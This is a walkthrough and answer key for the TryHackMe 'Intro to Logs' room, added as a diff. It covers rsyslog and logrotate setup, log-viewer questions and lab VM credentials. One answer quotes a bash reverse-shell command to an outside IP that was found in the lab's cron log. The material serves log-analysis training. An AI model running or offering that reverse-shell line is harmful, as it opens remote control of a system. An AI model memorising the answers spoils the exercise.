@@ -1,0 +1,172 @@
+Tryhackme - Intro to Logs
+Room: https://tryhackme.com/room/introtologs
+
+#This document contains solutions to the questions for this THM room, including a walkthrough on sections involving shell scripting:
+  • Task 2 Expanding Perspectives: Logs as Evidence of Historical Activity
+  • Task 3 Types, Formats, and Standards
+  • Task 4 Collection, Management, and Centralisation
+  • Task 5 Storage, Retention, and Deletion
+  • Task 6 Hands-on Exercise: Log analysis process, tools, and techniques
+
+#Room credentials
+    Username:	damianhall
+    Password:	Logs321!
+    IP:	MACHINE_IP
+
+#Connecting to VM via ssh. Make sure you are in the "Intro to Logs Analyst VM--bdar" tab
+    • ssh damianhall@MACHINE_IP
+    • Type "yes" + press "Enter"
+    • Enter password: Logs321!
+
+#Task 2
+#QUESTIONS
+Q1: "What is the name of your colleague who left a note on your Desktop?"
+    #Answer: Perry
+    #Solution: On the VM Desktop, you will see a note.txt file. Open it and you will find Perry's name at the bottom
+
+Q2: "What is the full path to the suggested log file for initial investigation?"
+    #Answer: /var/log/gitlab/nginx/access.log
+    #Solution: On the same note.txt file, you will read that Perry's letter suggested to use "/var/log/gitlab/nginx/access.log" file for initial investigation
+
+
+#Task 3
+#QUESTIONS:
+Q1: "Based on the list of log types in this task, what log type is used by the log file specified in the note from Task 2?"
+    #Answer: Web Server Log
+Q2: "Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task 2?" 
+    #Answer: Combined
+
+
+#Task 4 Collection, Management, and Centralisation
+*Practical Activity: Log Collection with rsyslog*
+  #IMPORTANT: When you open the Machine and the AttackBox, make sure you select and is in the "Intro to Log Analyst-VM--badr" tab
+
+1. Open a Terminal.
+
+2. Ensure rsyslog is Installed: You can check if rsyslog is installed by running the command:
+    • sudo systemctl status rsyslog
+
+#3 & 4
+3. Create a Configuration File: Use a text editor to create the following configuration file: gedit /etc/rsyslog.d/98-websrv-02-sshd.conf, nano /etc/rsyslog.d/98-websrv-02-sshd.conf, vi /etc/rsyslog.d/98-websrv-02-sshd.conf, or vim /etc/rsyslog.d/98-websrv-02-sshd.conf
+4. Add the Configuration: Add the following lines in /etc/rsyslog.d/98-websrv-02-sshd.conf to direct the sshd messages to the specific log file:
+
+    • nano /etc/rsyslog.d/98-websrv-02-sshd.conf  #I used nano, but you can choose any text editor from the option above
+
+    • Enter the following in the text editor:
+      $FileCreateMode 0644
+      programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log
+
+5. Save and Close the Configuration File.
+    • For nano: Ctrl+X
+              Press "Y" (for yes)
+              Press "Enter
+              Ctrl+X 
+
+6. Restart rsyslog: Apply the changes by restarting rsyslog with the command:
+    • sudo systemctl restart rsyslog
+
+7. Verify the Configuration: You can verify the configuration works by initiating an SSH connection to localhost via ssh localhost or by checking the log file after a minute or two.    
+
+    #I chose to verify by checking the log file. First, I went to the websrv-02. Below is the path:
+    • cd /var/log/websrv-02/ 
+          #The directory should change to something like this:
+              From: damianhall@ip-10-201-29-65:~$
+              To:   damianhall@ip-10-201-29-65:/var/log/websrv-02$ 
+
+    #Then I asked to get a list of directories. It should show this on the list: rsyslog_sshd.log (this verifies that the log file was created)
+    • ls -lsa
+          #Here is the code breakdown:
+              -l (long format) → Displays detailed information such as permissions, number of links, owner, group, size, and last modified time
+              -s (size in blocks) → Shows the size of each file in blocks (usually 1 block = 512 bytes or 1 KB depending on the system settings).  
+              -a (all) → Includes hidden files (those starting with .)
+
+              So, ls -lsa will:
+                  List all files, including hidden ones (-a)
+                  Show detailed file information (-l)
+                  Display file sizes in blocks in the first column (-s)
+
+#QUESTIONS:
+Q1: "After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at /var/log/websrv-02/rsyslog_sshd.log, indicating failed login attempts or brute forcing?"
+    #Answer: stansimon
+    #Solution: use "cat" to concatenate and to display the contents of files. Note, you must be in the "damianhall@ip-10-201-29-65:/var/log/websrv-02" directory
+        • cat rsyslog_sshd.log
+        • cat /var/log/websrv-02/rsyslog_sshd.log (this is the complete file path if you're not in the "/var/log/websrv-02" directory
+
+Q2: "What is the IP address of SIEM-02 based on the rsyslog configuration file /etc/rsyslog.d/99-websrv-02-cron.conf, which is used to monitor cron messages?"
+    #Answer: 10.10.10.101
+    #To find the answer for this, do: 
+      • cat /etc/rsyslog.d/99-websrv-02-cron.conf
+    
+Q3: "Based on the generated logs in /var/log/websrv-02/rsyslog_cron.log, what command is being executed by the root user?"
+    #Answer: /bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
+    #To find the answer for this, do:
+      • cat /etc/rsyslog.d/99-websrv-02-cron.conf
+
+
+#Task 5
+#QUESTIONS
+Q1: "Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, how many versions of old compressed log file copies will be kept?"
+    #Answer: 24
+
+Q2: "Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, what is the log rotation frequency?"
+    #Answer: hourly
+
+#Solution for Q1 & Q2 above is located in Step 2 of "Practical Activity: Log Management with logrotate"
+    • "/var/log/websrv-02/rsyslog_sshd.log {
+              daily
+              rotate 30..."
+
+*Practical Activity: Log Management with logrotate*
+#1 & 2
+1. Create a Configuration File: sudo gedit /etc/logrotate.d/98-websrv-02_sshd.conf, sudo nano /etc/logrotate.d/98-websrv-02_sshd.conf, sudo vi /etc/logrotate.d/98-websrv-02_sshd.conf, or sudo vim /etc/logrotate.d/98-websrv-02_sshd.conf
+2. Define Log Settings:
+
+    • sudo nano /etc/logrotate.d/98-websrv-02_sshd.conf #I used nano, but you can choose any text editor from the option above
+
+    • Enter the following in the text editor:
+          /var/log/websrv-02/rsyslog_sshd.log {
+              daily
+              rotate 30
+              compress
+              lastaction
+                  DATE=$(date +"%Y-%m-%d")
+                  echo "$(date)" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
+                  for i in $(seq 1 30); do
+                      FILE="/var/log/websrv-02/rsyslog_sshd.log.$i.gz"
+                      if [ -f "$FILE" ]; then
+                          HASH=$(/usr/bin/sha256sum "$FILE" | awk '{ print $1 }')
+                          echo "rsyslog_sshd.log.$i.gz "$HASH"" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
+                      fi
+                  done
+                  systemctl restart rsyslog
+              endscript
+            }
+
+3. Save and Close the file.
+
+4. Manual Execution:
+    • sudo logrotate -f /etc/logrotate.d/98-websrv-02_sshd.conf
+Done.
+
+
+#Task 6 
+#QUESTIONS
+Q1: "Upon accessing the log viewer URL for unparsed raw log files, what error does "/var/log/websrv-02/rsyslog_cron.log" show when selecting the different filters?"
+    #Answer: No date field
+    #Solution:
+    • Open the web browser in the VM and copy+paste the link: http://10.201.9.168:8111/log?log=%2Fvar%2Flog%2Fgitlab%2Fnginx%2Faccess.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_cron.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_sshd.log&log=%2Fvar%2Flog%2Fgitlab%2Fgitlab-rails%2Fapi_json.log
+    • Add a filter. The button is located just below the address. I selected "text filter"
+    • Copy+Paste the following in the filter box and hit "save": /var/log/websrv-02/rsyslog_cron.log
+    • You will see the error message: No date field
+
+Q2: "What is the process of standardising parsed data into a more easily readable and query-able format?"
+    #Answer: Normalisation
+    #Solution: Read under "Log Analysis Process" section of the room
+
+Q3: "What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address?"
+    #Answer: Enrichment
+    #Solution: Read under "Log Analysis Process" section of the room
+
+
+
+
